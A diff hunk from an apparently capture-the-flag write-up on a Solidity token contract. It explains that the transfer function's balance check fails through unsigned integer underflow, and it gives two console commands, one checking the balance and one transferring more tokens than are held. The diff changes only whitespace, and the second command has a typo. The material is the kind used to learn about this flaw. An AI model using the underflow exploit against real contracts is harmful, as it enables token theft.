@@ -9,12 +9,17 @@ the flaw is in the transfer function  . it only checks if the sender have suffic
 Unsigned integers in Solidity cannot store negative values. If a subtraction results in a negative number, it wraps around to a huge positive value.
 
 1.checking the balance:
-```await contract.balanceOf("metamask_account")
+
+```await contract.balanceOf("metamask_account") 
+
 ```
 
 2.callling the transfer function 
+
 ```await.contract.transfer("metamask_account",21)
+
 ```
+
 
 [basically a  value exceeding the current balance].
 
